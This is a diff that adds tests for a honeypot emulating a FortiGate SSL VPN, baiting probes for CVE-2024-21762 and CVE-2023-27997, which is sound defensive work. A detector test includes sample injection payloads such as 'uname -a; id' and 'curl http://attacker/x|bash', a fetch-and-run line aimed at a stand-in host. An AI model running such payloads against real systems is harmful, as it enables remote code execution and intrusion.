@@ -384,6 +384,7 @@ def test_all_trap_families_default_on():
     assert tbenv.CISCO_WEBVPN_ENABLED
     assert tbenv.IVANTI_VPN_ENABLED
     assert tbenv.ASPERA_FASPEX_ENABLED
+    assert tbenv.FORTIGATE_VPN_ENABLED
     assert tbenv.HIKVISION_ENABLED
     assert tbenv.HNAP1_ENABLED
     assert tbenv.GEOSERVER_ENABLED
@@ -1733,6 +1734,209 @@ async def test_dispatch_aspera_faspex_disabled_returns_404(flux_client, monkeypa
     resp = await flux_client.get(
         "/aspera/faspex/",
         headers={"X-Forwarded-For": "203.0.113.83"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Fake FortiGate SSL VPN trap (CVE-2024-21762 / CVE-2023-27997 bait) ---
+
+
+def test_fortigate_vpn_enabled_by_default():
+    assert tbenv.FORTIGATE_VPN_ENABLED
+
+
+def test_fortigate_vpn_default_paths_match_observed_probes():
+    for path in (
+        "/remote/login",
+        "/remote/logincheck",
+        "/remote/fgt_lang",
+        "/remote/error",
+        "/api/v2/cmdb/system/admin",
+        "/api/v2/cmdb/system/status",
+        "/api/v2/cmdb/system/global",
+        "/api/v2/monitor/router/policy",
+    ):
+        assert tbenv.is_fortigate_vpn_path(path), f"expected match: {path}"
+
+
+def test_fortigate_vpn_path_non_match():
+    for path in (
+        "/",
+        "/remote/",
+        "/remote/login.cgi",  # close, but not the FortiOS path
+        "/api/v2/cmdb/",
+        "/api/v2/cmdb/firewall/policy",  # not a fingerprint path we serve
+        "/.env",
+    ):
+        assert not tbenv.is_fortigate_vpn_path(path), f"unexpected match: {path}"
+
+
+def test_fortigate_vpn_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
+    assert not tbenv.is_fortigate_vpn_path("/remote/login")
+
+
+def test_render_fortigate_login_html_shape():
+    body = tbenv.render_fortigate_login_html("fortigate.example", "7.4.4", "2662").decode("utf-8")
+    assert "/remote/logincheck" in body
+    assert "FortiOS 7.4.4" in body
+    assert "build 2662" in body
+    assert "fortigate.example" in body
+
+
+def test_render_fortigate_logincheck_format():
+    body = tbenv.render_fortigate_logincheck()
+    assert b"ret=1" in body
+    assert b"redir=" in body
+
+
+def test_render_fortigate_admin_json_shape():
+    payload = json.loads(tbenv.render_fortigate_admin_json("7.4.4", "2662"))
+    assert payload["http_status"] == 401
+    assert payload["status"] == "error"
+    assert payload["version"] == "v7.4.4"
+    assert payload["build"] == 2662
+
+
+def test_render_fortigate_status_json_includes_version_banner():
+    payload = json.loads(tbenv.render_fortigate_status_json("fortigate.example", "7.4.4", "2662"))
+    assert payload["status"] == "success"
+    assert payload["results"]["version"] == "v7.4.4"
+    assert payload["results"]["hostname"] == "fortigate.example"
+    assert payload["results"]["serial"].startswith("FGVM")
+
+
+def test_render_fortigate_router_policy_json_envelope():
+    payload = json.loads(tbenv.render_fortigate_router_policy_json())
+    assert payload["status"] == "success"
+    assert payload["path"] == "router"
+    assert payload["name"] == "policy"
+    assert payload["results"] == []
+
+
+def test_extract_fortigate_logincheck_form_credential_field():
+    body = b"username=admin&credential=h%26unter2&ajax=1"
+    username, has_password = tbenv.extract_fortigate_logincheck_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "admin"
+    assert has_password is True
+
+
+def test_extract_fortigate_logincheck_form_password_field_fallback():
+    body = b"username=root&password=toor"
+    username, has_password = tbenv.extract_fortigate_logincheck_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "root"
+    assert has_password is True
+
+
+def test_fortigate_has_cmd_injection_indicators():
+    # CVE-2024-21762 PoC + classic shell-meta payloads.
+    assert tbenv._fortigate_has_cmd_injection("uname -a; id", "")
+    assert tbenv._fortigate_has_cmd_injection("", "id=$(id)")
+    assert tbenv._fortigate_has_cmd_injection("curl http://attacker/x|bash", "")
+    assert not tbenv._fortigate_has_cmd_injection("plain string", "username=admin")
+
+
+def test_fortigate_status_serial_is_per_request_unique():
+    a = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
+    b = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
+    assert a != b, "serial must be per-request unique — never a fixed literal"
+
+
+async def test_dispatch_fortigate_login_landing(flux_client):
+    resp = await flux_client.get(
+        "/remote/login?lang=en",
+        headers={"X-Forwarded-For": "203.0.113.91", "Host": "fortigate.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "/remote/logincheck" in text
+    assert "FortiOS 7.4.4" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "fortigate-login"
+    assert entry["fortigatePath"] == "/remote/login"
+
+
+async def test_dispatch_fortigate_logincheck_logs_username_and_sets_svpn_cookie(flux_client):
+    resp = await flux_client.post(
+        "/remote/logincheck",
+        data="username=admin&credential=h%26unter2&ajax=1",
+        headers={
+            "X-Forwarded-For": "203.0.113.92",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "ret=1" in text
+    set_cookie = resp.headers.get("Set-Cookie", "")
+    assert "SVPNCOOKIE=" in set_cookie
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "fortigate-logincheck"
+    assert entry["fortigateUsername"] == "admin"
+    assert entry["fortigateHasPassword"] is True
+    assert "credential" not in entry  # secret value never logged
+
+
+async def test_dispatch_fortigate_logincheck_cookie_per_request_unique(flux_client):
+    cookies = []
+    for i in range(2):
+        resp = await flux_client.post(
+            "/remote/logincheck",
+            data=f"username=u{i}&credential=p",
+            headers={
+                "X-Forwarded-For": f"203.0.113.{93 + i}",
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+        )
+        assert resp.status == 200
+        cookies.append(resp.headers.get("Set-Cookie", ""))
+    assert cookies[0] != cookies[1]
+    assert "SVPNCOOKIE=" in cookies[0]
+    assert "SVPNCOOKIE=" in cookies[1]
+
+
+async def test_dispatch_fortigate_admin_returns_permission_denied(flux_client):
+    resp = await flux_client.get(
+        "/api/v2/cmdb/system/admin",
+        headers={"X-Forwarded-For": "203.0.113.95"},
+    )
+    assert resp.status == 200
+    payload = await resp.json()
+    assert payload["http_status"] == 401
+    assert payload["status"] == "error"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "fortigate-cmdb-admin"
+
+
+async def test_dispatch_fortigate_router_policy_flags_cmd_injection(flux_client):
+    resp = await flux_client.post(
+        "/api/v2/monitor/router/policy",
+        data=b'{"name":"x;id"}',
+        headers={
+            "X-Forwarded-For": "203.0.113.96",
+            "Content-Type": "application/json",
+        },
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "fortigate-monitor-router-policy"
+    assert entry["fortigateHasCmdInjection"] is True
+
+
+async def test_dispatch_fortigate_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
+    resp = await flux_client.get(
+        "/remote/login",
+        headers={"X-Forwarded-For": "203.0.113.97"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
